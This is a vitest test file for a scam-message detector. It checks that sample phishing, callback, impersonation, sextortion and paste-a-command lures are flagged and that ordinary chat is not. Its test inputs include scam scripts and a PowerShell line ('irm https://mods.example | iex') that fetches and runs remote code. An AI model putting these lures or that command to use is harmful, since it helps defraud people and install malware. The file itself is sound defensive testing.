import { describe, expect, it } from "vitest";
import { analyzeMessage, foldLeetspeak } from "../../src/engine/message-rules";
import { extractInput } from "../../src/shared/extract";

function ids(text: string): string[] {
  return analyzeMessage(text).signals.map((signal) => signal.id.replace("message-", ""));
}

describe("message rules", () => {
  it.each([
    ["hey sorry, I accidentally reported your account. Contact the Discord staff to fix it", ["false-report", "account-threat", "staff-impersonation"]],
    ["FR33 N1TRO for the first 100 people, claim fast", ["free-reward", "urgency"]],
    ["can you test my game? download the launcher and run setup.exe", ["game-testing"]],
    ["send me your 2fa code so i can verify the trade", ["credential-request", "trade-verify"]],
    ["scan this QR code with the discord app to claim your free nitro", ["qr-login", "free-reward"]],
    ["to get the robux, open inspect element and paste this in the console", ["cookie-token"]],
    ["give me the items and I'll hold them, I'm a trusted middleman", ["hand-over-items", "middleman"]],
    ["vote for my team in the tournament pls", ["vote-scam"]],
    ["pay me with steam gift cards and I'll send the knife after", ["gift-card-payment"]],
    ["add me on telegram, i'll give you free skins", ["free-reward", "move-off-platform"]],
    ["Your Steam account will be banned in 24 hours, log in here to verify", ["account-threat", "urgency", "login-link"]],
    ["can you screen share so I can verify you own the account", ["screen-share", "trade-verify"]],
    ["Verify you are human: 1. Press Windows Button + R 2. Press CTRL + V 3. Press Enter", ["command-paste"]],
    ["to join the server you have to pass the bot check, open powershell and paste the code from the site", ["command-paste"]],
    ["paste the command in the run box to verify you are not a robot", ["command-paste", "run-command"]],
    ["run this in powershell to get the mod menu: irm https://mods.example | iex", ["run-command"]],
    ["connect your wallet to claim the free airdrop before it ends", ["wallet-connect"]],
    ["sync your metamask on the event page to get the NFT", ["wallet-connect"]],
    ["Your package is on hold. Please reply Y, then exit the text message and reopen it to activate the link", ["link-activation"]],
    ["Free GTA 6 Rockstar giveaway - grab it before it ends", ["free-reward"]],
  ])("flags %j", (text, expected) => {
    expect(ids(text)).toEqual(expect.arrayContaining(expected));
  });

  it.each([
    "gg wp, want to play again tomorrow?",
    "are you free tonight? we need one more for ranked",
    "lol my account got banned from that minecraft server for spamming",
    "can you send me the homework link?",
    "I'll pay you back for the pizza tomorrow",
    "my steam guard code isn't arriving, any idea why?",
    "Reminder: never share your password or 2FA code with anyone",
    "don't scan QR codes from strangers",
    "join my server, it has a minecraft event this weekend",
    "press windows + r and type dxdiag so we can see your gpu",
    "reply yes if you are coming tonight, here is the link to the server",
    "my steam wallet balance is low again",
    "If the button does not work, copy and paste this link into your browser",
    "never paste commands from strangers into powershell",
    "there are free games on the epic store this weekend",
  ])("stays quiet for %j", (text) => {
    expect(analyzeMessage(text).signals.filter((signal) => signal.strength !== "weak")).toEqual([]);
  });

  it("still catches a request after a negated phrase", () => {
    expect(ids("don't worry, just send me your password")).toContain("credential-request");
  });

  it("reports the scam family", () => {
    expect(analyzeMessage("I accidentally reported you").families).toEqual(["false_report"]);
    expect(analyzeMessage("verify you are human: press win+r, then ctrl+v").families).toEqual(["command_paste"]);
    expect(analyzeMessage("connect your wallet to claim the airdrop").families).toEqual(["wallet_drainer"]);
  });

  it("folds leetspeak only inside words", () => {
    expect(foldLeetspeak("fr33 n1tr0 for 100 people")).toBe("free nitro for 100 people");
  });
});

describe("callback scam rules", () => {
  const redacted = (text: string) => extractInput(text).redactedText;

  it("catches fake order, charge, and voicemail texts that send you to a phone number", () => {
    const walmart =
      '17605550182 Deposited a new message: "This notification relates to an HP Specter X 360 14 inch order for approximately $999. Open your Walmart account through the official app or website to review the purchase details. Please call us back or press 1 to speak with a Walmart customer support representative." Click here: 14695550147 to listen to full voice message.';
    expect(ids(redacted(walmart))).toEqual(expect.arrayContaining(["fake-voicemail", "fake-order-callback", "company-callback"]));
    expect(analyzeMessage(redacted(walmart)).families).toEqual(["callback_scam"]);
    expect(ids(redacted("Your Norton subscription has been renewed for $399.99. If you did not authorize this, call our billing team at (855) 712-4433."))).toEqual(
      expect.arrayContaining(["fake-order-callback", "company-callback"]),
    );
    expect(ids(redacted("PayPal: a payment of $649.00 to Coinbase was approved. Not you? Call 1-888-555-0193 now."))).toContain("fake-order-callback");
    expect(ids(redacted("You have 1 new voicemail. Tap here: 213-555-0142 to listen."))).toContain("fake-voicemail");
  });

  it("leaves ordinary messages about orders, calls, and voicemail alone", () => {
    for (const text of [
      "I ordered pizza for $20, call me back when you're free",
      "my order of $35 shipped today, I'll call you later",
      "she left a message, listen to it when you can",
      "You have a new voicemail. Call *86 to listen.",
      "the skin was $15 on the market, call me at 714-555-0199 if you want it",
      "Amazon says my package is late, call me after work",
    ]) {
      expect(ids(redacted(text)).filter((id) => ["fake-voicemail", "fake-order-callback", "company-callback"].includes(id)), text).toEqual([]);
    }
  });
});

describe("scams that often arrive without a link", () => {
  const redacted = (text: string) => {
    let message = extractInput(text).redactedText;
    for (const link of extractInput(text).links) {
      message = message.split(link).join(" [link] ");
    }
    return message;
  };
  const cases: [string, string, string][] = [
    ["investment_scam", "investment-returns", "Join our crypto plan, guaranteed returns of 3% daily, my mentor has never lost"],
    ["investment_scam", "withdrawal-fee", "Your profit is $48,200. To withdraw you must first pay the 20% tax so the funds can be released"],
    ["investment_scam", "investment-group", "I can add you to our VIP stock group, Professor Lee shares free signals every morning"],
    ["bank_impersonation", "safe-account", "This is the Chase fraud department. Your account is compromised, you need to move your savings to a safe account today"],
    ["bank_impersonation", "fraud-alert-reply", "Bank Alert: Did you attempt a purchase of $1,284.90 at Best Buy? Reply YES or NO"],
    ["payment_pressure", "cash-courier", "Withdraw the cash and deposit it into the Bitcoin ATM at the gas station, I will stay on the line"],
    ["government_impersonation", "government-threat", "Social Security Administration: your Social Security number has been suspended due to suspicious activity. Press 1"],
    ["government_impersonation", "government-threat", "This is the Sheriff's office. You missed jury duty and a warrant has been issued for your arrest"],
    ["tech_support", "tech-support-alert", "WARNING: your computer has been blocked because of a virus. Call Microsoft Support at 1-844-555-0187 now"],
    ["tech_support", "remote-access", "To fix it please download AnyDesk and give me the AnyDesk ID on your screen"],
    ["toll_delivery", "toll-notice", "E-ZPass: You have an unpaid toll balance of $6.99. Pay now to avoid late fees: https://ezpass-billing.example/pay"],
    ["toll_delivery", "dmv-notice", "DMV Final Notice: your driver's license will be suspended on Oct 10 due to unpaid traffic tickets. Pay at https://dmv-portal.example"],
    ["toll_delivery", "delivery-fee", "USPS: your package could not be delivered because the address is incomplete. Update your address here: https://usps-redelivery.example"],
    ["job_scam", "task-job", "Our app optimization tasks pay commission per task, you just need to recharge 100 USDT to unlock the next set"],
    ["job_scam", "easy-money-job", "Hi, I'm a recruiter. Part-time remote job, earn $300-$800 per day, no experience needed"],
    ["business_email", "bank-details-change", "Please note our updated bank details for all future invoices, attached is the new remittance information"],
    ["business_email", "bank-details-change", "Hi, I changed banks. Can you update my direct deposit before Friday's payroll?"],
    ["business_email", "boss-favor", "Are you available? I need you to buy 5 Apple gift cards for a client, I'm in a meeting"],
    ["sextortion", "sextortion", "I hacked your device and recorded a video of you. Send $1500 in Bitcoin or I will send the video to all your contacts"],
    ["sextortion", "sextortion", "pay me $200 or i'll share your pics with your friends"],
    ["marketplace_scam", "code-request", "Before I buy the couch I need to make sure you're real, I'm texting you a code, send it to me"],
    ["marketplace_scam", "payment-app-upgrade", "I sent the Zelle payment but it says you need to upgrade to a business account to receive it"],
    ["marketplace_scam", "overpayment", "Oops I accidentally sent you $900 instead of $90, can you refund the difference?"],
    ["account_appeal", "account-appeal", "Meta: your page has violated our copyright policy and will be disabled. Submit an appeal here https://meta-appeal-center.example"],
    ["recovery_scam", "fund-recovery", "Our team can recover your lost crypto from the scam, we have helped hundreds of victims get their money back"],
  ];

  it.each(cases)("catches %s (%s): %j", (family, rule, text) => {
    const analysis = analyzeMessage(redacted(text));
    expect(analysis.signals.map((signal) => signal.id.replace("message-", ""))).toContain(rule);
    expect(analysis.families).toContain(family);
  });

  it("notes wrong-number openers and moves to another app as weak signs", () => {
    expect(ids("Hi, is this Mark? Oh sorry, wrong number! You seem nice though")).toContain("wrong-number");
    expect(ids("let's move to whatsapp, it's easier to chat there")).toContain("move-off-platform");
  });

  it.each([
    "my bank texted me about a charge, I called the number on my card and it was fine",
    "can you pay the toll for me when we drive to LA?",
    "The DMV appointment is at 10, bring your license",
    "your package from UPS arrived, it's on the porch",
    "I earned $150 a day at the summer job, it was nice",
    "we spent $200 a day on food during the trip",
    "Our bank details have not changed. Please keep paying the usual account.",
    "are you free later? I need to make a payment at the bank, can you drive me",
    "share this video with your friends, it's hilarious",
    "the police said scammers ask for gift cards, so be careful",
    "my computer is so slow, can you call me later and help?",
    "I use TeamViewer to help my grandma with her PC",
    "I'll send you the code for the wifi when you get here",
    "send me the code you got in the email so I can check the game key is valid",
    "Venmo me for the tickets when you can",
    "how do I recover my Minecraft account after it got hacked?",
    "We guarantee delivery within two days",
    "My teacher explained how stocks work today",
    "Unusual sign-in activity on your account. If this wasn't you, contact support from the app.",
    "your UPS package is out for delivery today: https://www.ups.com/track",
  ])("leaves %j alone", (text) => {
    const strong = analyzeMessage(redacted(text)).signals.filter((signal) => signal.strength === "strong" || signal.strength === "critical");
    expect(strong.map((signal) => signal.id)).toEqual([]);
  });
});
